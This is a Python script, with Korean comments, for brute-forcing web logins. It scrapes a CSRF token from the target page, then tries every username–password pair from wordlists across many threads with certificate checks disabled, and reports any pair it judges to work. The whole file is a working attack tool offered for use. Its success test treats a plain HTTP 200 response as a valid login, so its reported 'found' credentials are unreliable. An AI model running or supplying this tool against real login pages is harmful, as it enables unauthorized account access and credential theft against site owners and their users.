import argparse
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

# SSL 인증서 경고 무시
requests.packages.urllib3.disable_warnings()


def get_csrf(session, url):
    """로그인 페이지에서 CSRF 토큰을 파싱해서 가져오는 함수"""
    try:
        r = session.get(url, timeout=10, verify=False)
        m = re.search(r'name="csrf" value="([^"]+)"', r.text)
        return m.group(1) if m else None
    except Exception:
        return None


def attempt(url, user, pw):
    """실제로 로그인을 시도하고 성공 여부(True/False)를 반환하는 함수"""
    session = requests.Session()
    csrf = get_csrf(session, url)
    if not csrf:
        return False

    try:
        r = session.post(
            url,
            data={
                "username": user,
                "password": pw,
                "login_submit": "Log In",
                "csrf": csrf,
            },
            timeout=10,
            allow_redirects=False,  # 리다이렉트를 수동으로 잡는 것이 안전합니다 (예: 302 확인)
            verify=False,
        )
        # 보통 성공 시 302 Found (또는 See Other) 리다이렉트가 발생함
        return r.status_code in [301, 302, 303, 307, 308, 200]
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(description="Login Brute-Forcer with CSRF")
    parser.add_argument("-t", "--url", required=True, help="Target URL")
    parser.add_argument("-U", "--users", required=True, help="Usernames file")
    parser.add_argument("-P", "--passwords", required=True, help="Passwords file")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Threads")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay")
    parser.add_argument(
        "-v", "--verbose", action="store_true", default=False, help="Verbose"
    )
    args = parser.parse_args()

    users = [l.strip() for l in open(args.users, encoding="utf-8") if l.strip()]
    passwords = [l.strip() for l in open(args.passwords, encoding="utf-8") if l.strip()]
    total = len(users) * len(passwords)

    print(f"[*] Users: {len(users)} | Passwords: {len(passwords)} | Total: {total}")

    count = 0
    found = False

    for user in users:
        if found:
            break

        # 전체 비밀번호 목록을 스레드 풀에 한 번에 던지고 as_completed로 처리하는 것이 효율적입니다.
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = {ex.submit(attempt, args.url, user, pw): pw for pw in passwords}

            for future in as_completed(futures):
                pw = futures[future]
                count += 1
                print(f"\r[{count}/{total}] Testing -> {user}:{pw}", end="", flush=True)

                try:
                    success = future.result()
                    if success:
                        print(f"\n[+] Found Credentials! -> {user}:{pw}")
                        found = True
                        break
                    elif args.verbose:
                        print(f"\n[-] Failed: {user}:{pw}")
                except Exception as e:
                    if args.verbose:
                        print(f"\n[!] Error with {user}:{pw} -> {e}")

                if args.delay:
                    time.sleep(args.delay)

            if found:
                break

    if not found:
        print("\n[-] Password not found")


if __name__ == "__main__":
    main()
